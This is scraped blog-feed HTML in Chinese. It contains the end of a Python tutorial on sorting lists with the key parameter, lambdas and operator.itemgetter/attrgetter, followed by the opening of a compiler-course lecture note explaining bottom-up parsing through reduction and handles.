<p><code>key</code>参数接受一个函数，该函数会对列表中的每个元素进行处理，返回一个用于比较的值。排序时，Python会根据<code>key</code>函数返回的值而非元素本身进行比较。例如，按字符串长度排序时，<code>key=len</code>会让Python比较字符串长度而非字母顺序。</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'date'</span>]</span>
words<span class="hljs-selector-class">.sort</span>(key=len)
<span class="hljs-built_in">print</span>(words)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'date'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>]</span>（长度<span class="hljs-number">3</span> &lt; <span class="hljs-number">5</span> &lt; <span class="hljs-number">6</span>）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-5">2.2 常见场景：按特定规则排序</h3>
<h4 data-id="heading-6">场景1：忽略大小写排序</h4>
<p>默认字符串排序区分大小写（大写字母排在小写字母前）。若需忽略大小写，可用<code>str.lower</code>作为<code>key</code>函数：</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'Banana'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'Cherry'</span>, <span class="hljs-string">'date'</span>]</span>
words<span class="hljs-selector-class">.sort</span>(key=str.lower)
<span class="hljs-built_in">print</span>(words)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'Banana'</span>, <span class="hljs-string">'Cherry'</span>, <span class="hljs-string">'date'</span>]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-7">场景2：按字典的某个键排序</h4>
<p>对包含字典的列表，可通过<code>key</code>指定排序依据的键。例如，按字典的<code>'age'</code>键升序排序：</p>
<pre><code class="hljs language-scss" lang="scss">data = <span class="hljs-selector-attr">[    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}]</span>
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=lambda x: x['age'])
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">场景3：按多条件排序</h4>
<p>若需先按一个条件排序，再按另一个条件排序，可让<code>key</code>函数返回元组。例如，先按年龄升序，再按姓名字母顺序排序：</p>
<pre><code class="hljs language-scss" lang="scss">data = <span class="hljs-selector-attr">[    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 25}]</span>
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=lambda x: (x['age'], x['name']))
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-9">场景4：按对象属性排序</h4>
<p>对自定义类的对象列表，可通过<code>key</code>指定排序依据的属性。例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>(<span class="hljs-subst">{self.age}</span>)"</span>

people = [Person(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">25</span>), Person(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">22</span>), Person(<span class="hljs-string">'Charlie'</span>, <span class="hljs-number">24</span>)]
sorted_people = <span class="hljs-built_in">sorted</span>(people, key=<span class="hljs-keyword">lambda</span> p: p.age)
<span class="hljs-built_in">print</span>(sorted_people)  <span class="hljs-comment"># 输出：[Bob(22), Charlie(24), Alice(25)]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-10">2.3 高级技巧：自定义函数与operator模块</h3>
<h4 data-id="heading-11">自定义函数作为key</h4>
<p>若排序逻辑复杂，可定义独立函数作为<code>key</code>。例如，按字典的<code>'age'</code>键加权排序：</p>
<pre><code class="hljs language-scss" lang="scss">def <span class="hljs-built_in">custom_key</span>(item):
    return item[<span class="hljs-string">'age'</span>] * <span class="hljs-number">2</span> + <span class="hljs-built_in">len</span>(item[<span class="hljs-string">'name'</span>])  # 年龄乘<span class="hljs-number">2</span>加姓名长度

data = [
    {'name': <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">25</span>},
    {'name': <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>},
    {'name': <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>}
]
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=custom_key)
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-12">使用operator模块</h4>
<p>Python的<code>operator</code>模块提供了<code>itemgetter</code>和<code>attrgetter</code>函数，可简化<code>key</code>函数的编写。例如，按字典的<code>'score'</code>键排序：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> <span class="hljs-keyword">operator</span>

<span class="hljs-keyword">data</span> = [
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">88</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">92</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">85</span>}
]
sorted_data = sorted(<span class="hljs-keyword">data</span>, key=<span class="hljs-keyword">operator</span>.itemgetter(<span class="hljs-string">'score'</span>))
print(sorted_data)
# 输出：[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">85</span>}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">88</span>}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">92</span>}]
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>对对象列表，可用<code>attrgetter</code>按属性排序：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> operator

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>(<span class="hljs-subst">{self.age}</span>)"</span>

people = [Person(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">25</span>), Person(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">22</span>), Person(<span class="hljs-string">'Charlie'</span>, <span class="hljs-number">24</span>)]
sorted_people = <span class="hljs-built_in">sorted</span>(people, key=operator.attrgetter(<span class="hljs-string">'age'</span>))
<span class="hljs-built_in">print</span>(sorted_people)  <span class="hljs-comment"># 输出：[Bob(22), Charlie(24), Alice(25)]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">三、sort()与sorted()：选择合适的排序工具</h2>
<h3 data-id="heading-14">3.1 原地排序 vs 创建新列表</h3>
<ul>
<li><code>list.sort()</code>是列表方法，直接修改原列表，返回<code>None</code>。适用于无需保留原始顺序的场景，如数据预处理。</li>
<li><code>sorted()</code>是内置函数，返回新排序列表，原列表不变。适用于需保留原始数据的场景，如展示排序结果后继续分析原数据。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">numbers = <span class="hljs-selector-attr">[3, 1, 4, 2]</span>
sorted_numbers = <span class="hljs-built_in">sorted</span>(numbers)  # 返回新列表
<span class="hljs-built_in">print</span>(numbers)  # 输出：<span class="hljs-selector-attr">[3, 1, 4, 2]</span>（原列表未变）
<span class="hljs-built_in">print</span>(sorted_numbers)  # 输出：<span class="hljs-selector-attr">[1, 2, 3, 4]</span>

numbers<span class="hljs-selector-class">.sort</span>()  # 原地排序
<span class="hljs-built_in">print</span>(numbers)  # 输出：<span class="hljs-selector-attr">[1, 2, 3, 4]</span>（原列表已变）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-15">3.2 性能与内存考虑</h3>
<ul>
<li><code>list.sort()</code>因原地操作，无需创建新列表，内存效率更高，适合处理大型列表。</li>
<li><code>sorted()</code>需创建新列表，内存开销略大，但代码更安全（避免意外修改原数据）。</li>
</ul>
<h2 data-id="heading-16">四、实战案例：key参数的灵活应用</h2>
<h3 data-id="heading-17">案例1：按文件扩展名排序</h3>
<p>假设有一个文件列表，需按扩展名排序：</p>
<pre><code class="hljs language-scss" lang="scss">files = <span class="hljs-selector-attr">[<span class="hljs-string">'document.pdf'</span>, <span class="hljs-string">'image.png'</span>, <span class="hljs-string">'spreadsheet.xlsx'</span>, <span class="hljs-string">'notes.txt'</span>]</span>

def <span class="hljs-built_in">get_extension</span>(filename):
    return filename.<span class="hljs-built_in">split</span>(<span class="hljs-string">'.'</span>)[-<span class="hljs-number">1</span>]  # 提取扩展名

sorted_files = <span class="hljs-built_in">sorted</span>(files, key=get_extension)
<span class="hljs-built_in">print</span>(sorted_files)
# 输出：[<span class="hljs-string">'document.pdf'</span>, <span class="hljs-string">'image.png'</span>, <span class="hljs-string">'notes.txt'</span>, <span class="hljs-string">'spreadsheet.xlsx'</span>]（按扩展名字母顺序）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-18">案例2：按元组中元素优先级排序</h3>
<p>对包含元组的列表，需先按第二个元素排序，再按第一个元素排序：</p>
<pre><code class="hljs language-scss" lang="scss">tuples = <span class="hljs-selector-attr">[(<span class="hljs-string">'a'</span>, 3), (<span class="hljs-string">'b'</span>, 1), (<span class="hljs-string">'c'</span>, 2), (<span class="hljs-string">'d'</span>, 1)]</span>
sorted_tuples = <span class="hljs-built_in">sorted</span>(tuples, key=lambda x: (x[<span class="hljs-number">1</span>], x[<span class="hljs-number">0</span>]))
<span class="hljs-built_in">print</span>(sorted_tuples)
# 输出：<span class="hljs-selector-attr">[(<span class="hljs-string">'b'</span>, 1), (<span class="hljs-string">'d'</span>, 1), (<span class="hljs-string">'c'</span>, 2), (<span class="hljs-string">'a'</span>, 3)]</span>（先按第二个元素升序，再按第一个元素字母顺序）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-19">案例3：复杂逻辑排序</h3>
<p>假设需按以下规则排序：先按字符串长度降序，长度相同则按字母顺序升序：</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'fig'</span>]</span>
sorted_words = <span class="hljs-built_in">sorted</span>(words, key=lambda x: (-len(x), x))  # 长度取负实现降序
<span class="hljs-built_in">print</span>(sorted_words)
# 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'fig'</span>]</span>（长度<span class="hljs-number">6</span> &gt; <span class="hljs-number">5</span> &gt; <span class="hljs-number">3</span>，长度<span class="hljs-number">5</span>的'apple' &lt; 'cherry'）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-20">五、总结：key参数的“核心价值”</h2>
<ul>
<li><strong>灵活性</strong>：通过自定义<code>key</code>函数，可实现任意复杂的排序逻辑，如按对象属性、字典键、计算结果等排序。</li>
<li><strong>通用性</strong>：适用于<code>list.sort()</code>和<code>sorted()</code>，覆盖原地排序和创建新列表的需求。</li>
<li><strong>可读性</strong>：结合lambda表达式或<code>operator</code>模块，代码简洁易读，避免冗长的比较函数。</li>
</ul>
<p>掌握<code>key</code>参数后，Python列表排序将不再受限于默认规则。无论是处理混合类型数据、多条件排序，还是复杂逻辑排序，<code>key</code>都能让排序变得简单高效。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[语法分析(4)：以听众为中心的自底向上语法分析]]></title>    <link>https://juejin.cn/post/7605800124883615750</link>    <guid>https://juejin.cn/post/7605800124883615750</guid>    <pubDate>2026-02-13T01:27:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605800124883615750" data-draft-id="7605807405306986559" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="语法分析(4)：以听众为中心的自底向上语法分析"/> <meta itemprop="keywords" content="编译原理"/> <meta itemprop="datePublished" content="2026-02-13T01:27:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="搞笑僵尸思考时间"/> <meta itemprop="url" content="https://juejin.cn/user/168673917806618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            语法分析(4)：以听众为中心的自底向上语法分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/168673917806618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    搞笑僵尸思考时间
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:27:32.000Z" title="Fri Feb 13 2026 01:27:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>本文是本人撰写的编译原理讲义。</p>
<p>本系列讲义适用于：被强迫学习编译原理前端，或者希望弄明白如何做科研的人。</p>
<h3 data-id="heading-0">1. 归约：人类语法分析过程核心</h3>
<p>为编程语言设计出语法，终究是要给人用来编程。也就是说，语法一方面是用来组织语言的，另一方面也是要用来给机器和人来理解这个被组织出来的符号串的。</p>
<p>那么，既然前面单纯地以机器为中心的理解过程被证明暂时不太可行，那不如试一下分析人类是怎么理解一句话吧，然后模仿这个过程写一个分析算法？</p>
<p>还是随便先拿个简单例子，就“我是大学生”这句话吧。</p>
<p>首先人肯定是一个一个字去听，听的过程中如果发现了一个词，肯定会根据词性来进行归纳，然后再根据各种语法合并这些语法概念，直到最后发现这是一个句子。</p>
<p>下面的过程就是一个模拟理解这句话的过程，其中|模拟了读入的进度。</p>
<pre><code class="hljs language-xml" lang="xml">我|是大学生 →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span>是|大学生 →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">动词</span>&gt;</span>大学生| →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">动词</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">名词</span>&gt;</span>| → <span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">谓语</span>&gt;</span>| → <span class="hljs-tag">&lt;<span class="hljs-name">句子</span>&gt;</span>|
</code></pre>
<p>如果用语法树的构建来表示，那就是：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c67dcb58a534c8fbd5fb6eac1ae167a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=xu23e88Umt0SJzxifX6lTz6ZHHU%3D" alt="" loading="lazy"/>​<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/588d9631d66047409dfc0422540ba1b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=GouGFWZ1wOdEjDFOPrsGNivdo%2Fw%3D" alt="" loading="lazy"/></p>
<p>看起来，这样的理解方式似乎是为了给大脑减负：一方面我们有从左到右的阅读习惯，另一方面由于人类的短时记忆极其有限（通常只能维持 7 个左右的单位），所以总会想办法把已经读进去的符号尽可能抽象成一个语法符号，从而化简这段东西在脑海里的复杂度，方便理解。</p>
<p>那如果说组织语言是理解语言的逆过程，意味着组织语言就是类似于LL1一样的不断在非终结符中往下挖出来一棵树的过程，而顺序和我们的阅读顺序相反，是从右往左深度优先遍历。</p>
<p>之所以按照这种顺序，因为这样子左边相对右边要更迟推导出来，与理解过程中最先被处理相对应。</p>
<p>话说回来，理解这个词也太宽泛了，感觉离语法树这个语境太远了，换个什么词比较好呢。。</p>
<p>这些游兵散勇一样的单词，一簇一簇地归纳到了某个语法概念的旗下，有点像是约分、约简一样，把复杂的问题给简化。。。归纳。。约简。。归约？？？可还行。</p>
<p>在电脑敲下归约这个词的时候，输入法总是情不自禁把另一个同音词规约放到了首位。莫非这两词差不多？？好像不对，规更像是规范，由于是名词，所以后面的约也更像是约定的约，跟归约的意思差远了！</p>
<p>说罢，便将归约设为了固定首位。</p>
<h3 data-id="heading-1">2. 找出句柄：基于归约的语法分析重点</h3>
<p>总结下现在的情况：从左往右扫描待解析的命令，然后一旦发现可以归约的东西就进行归约。</p>
<p>Emm，怎么越想越像拼拼图的过程了：先把一个一个的拼图碎片按相似度拼出一个个模块，之后要是模块之间又有相似性，就再次拼装到一起。</p>
<p>那现在问题来了，拼图是有图像让我发现他们的相似性的；这符号串中，怎么去发现符号之间的关联性呢？</p>
<p>啊对，这些符号串是通过一定的规则，也就是产生式，从左部推导出右部伸展来的。</p>
